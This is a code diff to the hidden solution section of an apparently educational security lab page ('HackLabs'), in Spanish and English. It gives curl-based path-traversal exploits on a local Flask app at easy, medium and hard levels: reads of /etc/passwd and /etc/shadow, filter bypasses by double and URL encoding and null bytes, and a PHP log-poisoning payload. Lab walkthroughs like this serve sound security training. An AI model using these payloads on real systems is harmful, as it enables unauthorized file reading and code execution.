@@ -29,62 +29,76 @@
 
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
-    <h3>Pasos de explotación</h3>
+    <h3>Easy — Path traversal directo</h3>
     <ol>
-      <li>El parámetro <code>file</code> se concatena con la ruta base <code>static/files/</code> sin validación.</li>
-      <li><strong>Easy:</strong> Usa <code>../</code> directamente:
-        <pre>/files?file=../../app.py                  # código fuente
-/files?file=../../database/schema.sql    # esquema BD
-/files?file=../../secret/flag.txt        # flag XXE</pre></li>
-      <li><strong>Medium:</strong> Filtra <code>../</code> con un solo reemplazo. Bypass con doble traversal:
-        <pre># ....// → al eliminar ../ interno queda ../
-/files?file=....//....//app.py
-/files?file=....//....//database/schema.sql
-
-# Backslash (funciona en Windows)
-/files?file=..\..\app.py</pre></li>
-      <li><strong>Hard:</strong> Filtra <code>../</code> y <code>..\</code> recursivamente. Usa herramientas automatizadas:
-        <pre># dotdotpwn prueba múltiples técnicas de encoding
-dotdotpwn -m http -h TARGET_IP -x 5000 -f /etc/passwd \
-  -u "http://TARGET_IP/files?file=TRAVERSAL" -k "root:"
-
-# ffuf con wordlists LFI de SecLists
-ffuf -u "http://TARGET_IP/files?file=FUZZ" \
-  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-  -mc 200 -fs 0</pre></li>
-      <li>Con Burp Suite: intercepta el GET y modifica el parámetro <code>file</code> manualmente.</li>
+      <li>El parametro <code>file</code> se concatena con la ruta base <code>static/files/</code> sin ninguna validacion. Lee archivos del sistema directamente:
+        <pre>curl "http://localhost:5000/files?file=../../etc/passwd"
+curl "http://localhost:5000/files?file=../../etc/shadow"
+curl "http://localhost:5000/files?file=../../app.py"</pre></li>
+      <li>Lee el log de acceso (preparacion para log poisoning):
+        <pre>curl "http://localhost:5000/files?file=../../logs/access.log"</pre></li>
+      <li>Log poisoning (concepto de RCE): envenena el log enviando codigo en el User-Agent:
+        <pre>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://localhost:5000/</pre></li>
+      <li>Verifica que el payload quedo registrado en el log:
+        <pre>curl "http://localhost:5000/files?file=../../logs/access.log"</pre>
+        Deberias ver tu payload PHP en la salida. En un servidor Apache con mod_php, incluir este log via LFI ejecutaria el PHP. En HackLabs (Flask) la ejecucion no ocurre, pero el concepto es identico al explotado en CTFs y servidores reales.</li>
+    </ol>
+    <h3>Medium — Bypass de filtro (strips ../ una vez)</h3>
+    <ol>
+      <li>El servidor elimina <code>../</code> pero solo en un unico pase. Usa <code>....//</code> para que tras el reemplazo quede <code>../</code>:
+        <pre>curl "http://localhost:5000/files?file=....//....//etc/passwd"</pre></li>
+      <li>O URL encoding para evadir el filtro de cadena:
+        <pre>curl "http://localhost:5000/files?file=%2e%2e%2f%2e%2e%2fetc/passwd"</pre></li>
+      <li>Accede al log del servidor con el mismo bypass:
+        <pre>curl "http://localhost:5000/files?file=....//....//logs/access.log"</pre></li>
+    </ol>
+    <h3>Hard — Bypass de filtro recursivo (double URL encoding)</h3>
+    <ol>
+      <li>El filtro elimina <code>../</code> en bucle. Usa doble URL-encoding (<code>%25</code> es <code>%</code>, por lo que <code>%252e</code> decodifica a <code>%2e</code> que decodifica a <code>.</code>):
+        <pre>curl "http://localhost:5000/files?file=%252e%252e%252f%252e%252e%252fetc/passwd"</pre></li>
+      <li>O null byte (en versiones antiguas de PHP para truncar la extension):
+        <pre>curl "http://localhost:5000/files?file=../../etc/passwd%00.jpg"</pre></li>
+      <li>Accede al log con el mismo bypass de doble encoding:
+        <pre>curl "http://localhost:5000/files?file=%252e%252e%252f%252e%252e%252flogs/access.log"</pre></li>
     </ol>
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
-    <h3>Exploitation Steps</h3>
+    <h3>Easy — Direct path traversal</h3>
     <ol>
-      <li>The <code>file</code> parameter is concatenated with the base path <code>static/files/</code> without validation.</li>
-      <li><strong>Easy:</strong> Use <code>../</code> directly:
-        <pre>/files?file=../../app.py                  # source code
-/files?file=../../database/schema.sql    # DB schema
-/files?file=../../secret/flag.txt        # XXE flag</pre></li>
-      <li><strong>Medium:</strong> Filters <code>../</code> with a single-pass replace. Bypass with double traversal:
-        <pre># ....// → removing inner ../ leaves ../
-/files?file=....//....//app.py
-/files?file=....//....//database/schema.sql
-
-# Backslash (works on Windows)
-/files?file=..\..\app.py</pre></li>
-      <li><strong>Hard:</strong> Recursively filters <code>../</code> and <code>..\</code>. Use automated tools:
-        <pre># dotdotpwn tests multiple encoding techniques
-dotdotpwn -m http -h TARGET_IP -x 5000 -f /etc/passwd \
-  -u "http://TARGET_IP/files?file=TRAVERSAL" -k "root:"
-
-# ffuf with SecLists LFI wordlists
-ffuf -u "http://TARGET_IP/files?file=FUZZ" \
-  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-  -mc 200 -fs 0</pre></li>
-      <li>With Burp Suite: intercept the GET request and modify the <code>file</code> parameter manually.</li>
+      <li>The <code>file</code> parameter is concatenated with the base path <code>static/files/</code> without any validation. Read system files directly:
+        <pre>curl "http://localhost:5000/files?file=../../etc/passwd"
+curl "http://localhost:5000/files?file=../../etc/shadow"
+curl "http://localhost:5000/files?file=../../app.py"</pre></li>
+      <li>Read the access log (preparation for log poisoning):
+        <pre>curl "http://localhost:5000/files?file=../../logs/access.log"</pre></li>
+      <li>Log poisoning (RCE concept): poison the log by sending code in the User-Agent:
+        <pre>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://localhost:5000/</pre></li>
+      <li>Verify the payload was recorded in the log:
+        <pre>curl "http://localhost:5000/files?file=../../logs/access.log"</pre>
+        You should see your PHP payload in the output. On an Apache server with mod_php, including this log via LFI would execute the PHP. In HackLabs (Flask) execution does not occur, but the concept is identical to what is exploited in CTFs and real servers.</li>
+    </ol>
+    <h3>Medium — Filter bypass (strips ../ once)</h3>
+    <ol>
+      <li>The server removes <code>../</code> but only in a single pass. Use <code>....//</code> so that after replacement <code>../</code> remains:
+        <pre>curl "http://localhost:5000/files?file=....//....//etc/passwd"</pre></li>
+      <li>Or URL encoding to evade string-based filtering:
+        <pre>curl "http://localhost:5000/files?file=%2e%2e%2f%2e%2e%2fetc/passwd"</pre></li>
+      <li>Access the server log with the same bypass:
+        <pre>curl "http://localhost:5000/files?file=....//....//logs/access.log"</pre></li>
+    </ol>
+    <h3>Hard — Recursive filter bypass (double URL encoding)</h3>
+    <ol>
+      <li>The filter removes <code>../</code> in a loop. Use double URL-encoding (<code>%25</code> is <code>%</code>, so <code>%252e</code> decodes to <code>%2e</code> which decodes to <code>.</code>):
+        <pre>curl "http://localhost:5000/files?file=%252e%252e%252f%252e%252e%252fetc/passwd"</pre></li>
+      <li>Or null byte (on old PHP versions to truncate the extension):
+        <pre>curl "http://localhost:5000/files?file=../../etc/passwd%00.jpg"</pre></li>
+      <li>Access the log with the same double-encoding bypass:
+        <pre>curl "http://localhost:5000/files?file=%252e%252e%252f%252e%252e%252flogs/access.log"</pre></li>
     </ol>
     <h3>Tools</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span></div>
   </div>
 </div>
 {% endblock %}
